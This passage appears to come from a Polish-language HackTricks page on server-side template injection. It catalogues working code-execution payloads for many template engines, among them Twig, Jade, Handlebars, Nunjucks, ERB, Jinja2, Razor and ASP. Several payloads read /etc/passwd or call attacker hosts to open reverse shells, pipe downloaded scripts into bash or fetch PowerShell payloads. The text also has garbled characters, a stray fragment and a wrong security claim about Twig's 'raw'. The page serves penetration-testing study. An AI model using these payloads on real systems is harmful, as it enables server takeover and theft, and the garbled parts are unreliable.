{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Format szablonu**

Twig jest popularnym jzykiem szablon贸w u偶ywanym w wielu frameworkach internetowych, takich jak Symfony czy Laravel. Jest to jzyk oparty na skadni szablon贸w, kt贸ry umo偶liwia programistom tworzenie dynamicznych stron internetowych. Twig jest bezpieczny i chroni przed atakami takimi jak Server-Side Template Injection (SSTI).

**Server-Side Template Injection (SSTI) w Twig**

Server-Side Template Injection (SSTI) to technika ataku, kt贸ra polega na wstrzykiwaniu kodu szablonu po stronie serwera. W przypadku Twig, SSTI mo偶e wystpi, gdy nieprawidowo walidowane dane u偶ytkownika s wstrzykiwane bezporednio do szablonu Twig. Atakujcy mo偶e wykorzysta t luk, aby wykona kod na serwerze i uzyska dostp do poufnych danych lub zdalnie kontrolowa aplikacj.

**Przykad SSTI w Twig**

Poni偶ej przedstawiono przykad kodu Twig, kt贸ry jest podatny na SSTI:

```twig
{{ user_input }}
```

W powy偶szym przykadzie `user_input` jest bezporednio wstrzykiwane do szablonu Twig. Jeli atakujcy dostarczy zoliwy kod jako `user_input`, mo偶e to prowadzi do wykonania niebezpiecznych operacji na serwerze.

**Zapobieganie SSTI w Twig**

Aby zapobiec atakom SSTI w Twig, nale偶y zawsze prawidowo walidowa i filtrowa dane u偶ytkownika przed ich wstrzykiwaniem do szablon贸w. Nale偶y unika bezporedniego wstrzykiwania niezaufanych danych do szablon贸w i zawsze u偶ywa bezpiecznych metod dostarczanych przez Twig, takich jak `escape` lub `raw`.

**Podsumowanie**

Server-Side Template Injection (SSTI) to powa偶na luka w zabezpieczeniach, kt贸ra mo偶e prowadzi do powa偶nych konsekwencji. W przypadku Twig, nale偶y zawsze dba o prawidowe walidowanie i filtrowanie danych u偶ytkownika, aby zapobiec atakom SSTI.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Wicej informacji**

* W sekcji Twig i Twig (Sandboxed) na stronie [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates to silnik szablon贸w natywny dla PHP, czerpicy inspiracj z Twig. Jednak w przeciwiestwie do Twig, kt贸ry wprowadza now skadni, Plates wykorzystuje natywny kod PHP w szablonach, co czyni go intuicyjnym dla programist贸w PHP.

Kontroler:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Szablon strony:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
Szablon ukadu:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Wicej informacji**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib i HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) to to samo co PHPlib, ale przeniesione do Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template, which is then executed by the server. This can lead to remote code execution (RCE) and other serious security issues.

## Exploiting SSTI in `authors.php`

In the `authors.php` file, there may be a vulnerability that allows for SSTI. By injecting malicious code into the server-side template, an attacker can execute arbitrary commands on the server.

To exploit this vulnerability, follow these steps:

1. Identify the injection point: Look for user-controlled input that is directly used in the template engine. This can include variables, function calls, or other template constructs.

2. Craft the payload: Construct a payload that will execute the desired command on the server. This can vary depending on the template engine being used.

3. Inject the payload: Submit the payload through the user-controlled input to trigger the SSTI vulnerability.

4. Verify the exploitation: Check if the injected code is executed by observing the server's response or by checking for the desired side effects.

## Prevention and Mitigation

To prevent SSTI vulnerabilities, follow these best practices:

- Input validation and sanitization: Always validate and sanitize user input before using it in a template engine. This can help prevent malicious code injection.

- Template engine configuration: Configure the template engine to restrict access to sensitive server-side functions and variables.

- Least privilege principle: Ensure that the server-side code has the minimum necessary permissions to prevent unauthorized access.

- Regular updates: Keep the template engine and server software up to date to patch any known vulnerabilities.

By following these practices, you can reduce the risk of SSTI vulnerabilities and protect your server from potential attacks.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Wicej informacji**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Wicej informacji**

* W sekcji Jade na stronie [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) to niekompilujcy silnik szablon贸w PHP, kt贸ry u偶ywa znacznik贸w XML do podziau dokumentu na r贸偶ne czci.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Wicej informacji**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Przechodzenie cie偶k (wicej informacji [tutaj](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Bd
* ${7\*7} = ${7\*7}
* Nic
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Wicej informacji**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Szablon** | **Opis**                                |
| ------------ | --------------------------------------- |
|              | Ocena i renderowanie wyniku              |
|              | Ocena i renderowanie zakodowanego HTML-a |
|              | Komentarz                                |
| and          | Pozwala na kod (domylnie wyczone)     |

* \= 49

**Strona klienta**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Serwerowa strona**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Wicej informacji**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Przykad renderowania po stronie serwera**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Wicej informacji**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Brak wyniku
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Bd
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Wicej informacji**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Bd`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Wicej informacji**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Wicej informacji**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Sprawd藕 nastpujc stron, aby dowiedzie si sztuczek dotyczcych **omijania piaskownic przy wykonaniu dowolnych polece** w pythonie:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Wicej informacji**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Oficjalna strona](http://jinja.pocoo.org)

> Jinja2 to zaawansowany silnik szablon贸w dla Pythona. Posiada pene wsparcie dla Unicode, opcjonalne zintegrowane rodowisko wykonawcze w trybie piaskownicy, jest szeroko stosowany i posiada licencj BSD.

* `{{7*7}} = Bd`
* `${7*7} = ${7*7}`
* `{{foobar}} Nic`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Format szablonu**

Jinja2 jest silnym i elastycznym silnikiem szablon贸w, kt贸ry jest szeroko stosowany w aplikacjach internetowych opartych na Pythonie. Szablon Jinja2 skada si z tekstu i wyra偶e, kt贸re s otoczone podw贸jnymi nawiasami klamrowymi `{{ }}` lub podw贸jnymi nawiasami klamrowymi z procentami `{% %}`. Wyra偶enia wewntrz tych nawias贸w s ewaluowane i zastpowane wartociami podczas renderowania szablonu.

**Podatno na Server-Side Template Injection (SSTI)**

Server-Side Template Injection (SSTI) to podatno, kt贸ra wystpuje, gdy aplikacja internetowa umo偶liwia u偶ytkownikom wprowadzanie kodu szablonu, kt贸ry jest nastpnie ewaluowany i wykonany po stronie serwera. Jeli aplikacja nie sprawdza i nie waliduje danych wejciowych, atakujcy mo偶e wstrzykn zoliwy kod szablonu, co mo偶e prowadzi do wykonania dowolnego kodu na serwerze.

**Wykorzystanie SSTI w Jinja2**

Aby wykorzysta podatno SSTI w Jinja2, atakujcy musi znale藕 miejsce, w kt贸rym aplikacja umo偶liwia wstrzyknicie kodu szablonu. Nastpnie atakujcy mo偶e u偶y r贸偶nych technik, takich jak wstrzykiwanie zmiennych, wywoywanie funkcji, iterowanie po obiektach, aby manipulowa kodem szablonu i osign wykonanie dowolnego kodu na serwerze.

**Zabezpieczenia przed SSTI**

Aby zabezpieczy si przed atakami SSTI, nale偶y:

- Dokadnie sprawdza i walidowa dane wejciowe.
- Unika bezporedniego wstrzykiwania danych wejciowych do kodu szablonu.
- U偶ywa bezpiecznych metod renderowania szablon贸w, kt贸re automatycznie unikaj ewaluacji niebezpiecznego kodu.

**Podsumowanie**

Podatno na Server-Side Template Injection (SSTI) w Jinja2 mo偶e prowadzi do powa偶nych konsekwencji, takich jak wykonanie dowolnego kodu na serwerze. Aby zabezpieczy si przed tym rodzajem ataku, nale偶y dokadnie sprawdza i walidowa dane wejciowe oraz unika bezporedniego wstrzykiwania ich do kodu szablonu.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE niezale偶ne od**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Wicej szczeg贸贸w na temat nadu偶ywania Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Inne adunki w [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Wicej informacji**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Sukces`
* `@() <= Sukces`
* `@("{{code}}") <= Sukces`
* `@ <=Sukces`
* `@{} <= BD!`
* `@{ <= BD!`
* `@(1+2)`
* `@( //KodC# )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA");`

Metoda `.NET` `System.Diagnostics.Process.Start` mo偶e by u偶yta do uruchomienia dowolnego procesu na serwerze i tym samym utworzenia webshell. Przykad podatnej aplikacji internetowej mo偶na znale藕 w [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Wicej informacji**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nic
* `<%= response.write(date()) %>` = \<Data>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Wicej informacji**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Nawet jeli to perl, u偶ywa tag贸w podobnych do ERB w Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Bd`
```
<%= perl code %>
<% perl code %>
```
### SSTI w GO

W silniku szablon贸w Go mo偶na potwierdzi jego u偶ycie za pomoc konkretnych payload贸w:

* `{{ . }}`: Ujawnia struktur danych wejciowych. Na przykad, jeli przekazany zostanie obiekt z atrybutem `Password`, `{{ .Password }}` mo偶e go ujawni.
* `{{printf "%s" "ssti" }}`: Powinno wywietli cig znak贸w "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Te payloady powinny zwr贸ci "ssti" bez dodawania "html" lub "js". Wicej dyrektyw mo偶na znale藕 w dokumentacji Go [tutaj](https://golang.org/pkg/text/template).

**Eksploatacja XSS**

Z pakietem `text/template` XSS mo偶e by prosty poprzez bezporednie wstawienie payloadu. W przeciwnym razie pakiet `html/template` koduje odpowied藕, aby temu zapobiec (np. `{{"<script>alert(1)</script>"}}` daje wynik `&lt;script&gt;alert(1)&lt;/script&gt;`). Niemniej jednak, definicja i wywoanie szablonu w Go mog omin to kodowanie:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**Eksploatacja RCE**

Eksploatacja RCE r贸偶ni si znacznie midzy `html/template` a `text/template`. Modu `text/template` pozwala na bezporednie wywoywanie dowolnej publicznej funkcji (za pomoc wartoci "call"), co nie jest dozwolone w `html/template`. Dokumentacja dla tych modu贸w jest dostpna [tutaj dla html/template](https://golang.org/pkg/html/template/) i [tutaj dla text/template](https://golang.org/pkg/text/template/).

W przypadku RCE za pomoc SSTI w Go mo偶na wywoywa metody obiektu. Na przykad, jeli dostarczony obiekt ma metod `System` wykonujc polecenia, mo偶na j wykorzysta w ten spos贸b: `{{ .System "ls" }}`. Zazwyczaj konieczne jest uzyskanie dostpu do kodu 藕r贸dowego, jak w podanym przykadzie:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Wicej informacji**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Wicej atak贸w

Sprawd藕 reszt [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) dla wicej atak贸w. Mo偶esz r贸wnie偶 znale藕 interesujce informacje o tagach w [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Powizana pomoc

Jeli uwa偶asz, 偶e mo偶e by przydatne, przeczytaj:

* [Flask tricks](../../network-services-pentesting/pentesting-web/flask.md)
* [Python magic functions](broken-reference/)

## Narzdzia

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Lista wykrywania Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Praktyka i odniesienia

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najwa偶niejsze wydarzenie zwizane z cyberbezpieczestwem w **Hiszpanii** i jedno z najwa偶niejszych w **Europie**. Z misj promowania wiedzy technicznej, ten kongres jest gorcym punktem spotka dla profesjonalist贸w technologii i cyberbezpieczestwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
